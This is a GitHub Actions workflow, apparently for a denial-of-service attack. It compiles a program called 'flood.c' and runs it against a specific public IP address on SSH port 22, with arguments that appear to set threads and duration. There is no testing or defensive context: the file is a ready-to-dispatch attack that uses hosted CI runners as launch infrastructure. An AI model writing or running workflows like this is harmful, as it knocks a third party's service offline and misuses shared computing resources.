name: dd
on: workflow_dispatch
jobs:
  dd:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: gcc -O3 -flto -march=native -pthread -o flood flood.c
      - run: ./flood 216.202.205.235 22 4 500
